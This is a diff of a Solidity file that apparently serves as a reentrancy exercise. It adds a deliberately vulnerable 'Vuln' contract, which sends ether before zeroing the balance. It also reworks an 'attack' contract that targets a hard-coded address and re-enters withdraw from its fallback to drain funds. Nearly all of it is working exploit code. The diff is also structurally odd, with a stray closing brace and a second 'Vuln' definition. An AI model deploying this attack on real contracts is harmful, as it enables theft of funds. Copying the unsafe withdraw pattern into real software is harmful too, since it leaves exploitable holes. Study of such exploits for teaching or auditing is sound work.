@@ -21,41 +21,51 @@ contract Vuln {
     }
 }
 
+}
+
+contract Vuln {
+    mapping(address => uint256) public balances;
+    function deposit() public payable {
+        // Increment their balance with whatever they pay
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw() public {
+        // Refund their balance
+        msg.sender.call.value(balances[msg.sender])("");
+        // Set their balance to 0
+        balances[msg.sender] = 0;
+    }
+}
+
 contract attack {
     address payable owner;
-    address vuln_contract = 0x36A540E3A78084962B75E25877CfACf8846Be018;
-    Vuln public vuln = Vuln(address(vuln_contract));
+    Vuln public vuln_wal = Vuln(address(0x36A540E3A78084962B75E25877CfACf8846Be018));
     uint256 public count;
-    
+
     constructor() public
     {
         owner = msg.sender; 
         count = 0;
     }
-
-    fallback () external payable 
-    {
-        count += 1;
-
-        if (count <= 2) 
-        {
-            vuln.withdraw();
-        }
-    }
     
     function atk() public payable
     {
-        count = 0;
-        vuln.deposit.value(msg.value)();
-    }
-
-    function gimmeGimme() public 
-    {
-        if(msg.sender == owner)
+        if (msg.value >= 0.1 ether)
         {
-            msg.sender.send(address(this).balance);
+            vuln_wal.deposit.value(0.1 ether)();
+            vuln_wal.withdraw();
         }
     }
+
+    fallback () external payable 
+    {
+        count++;
+
+        if (count < 8)
+        {
+            vuln_wal.withdraw();
+        }
+    }
+
 }
-
-
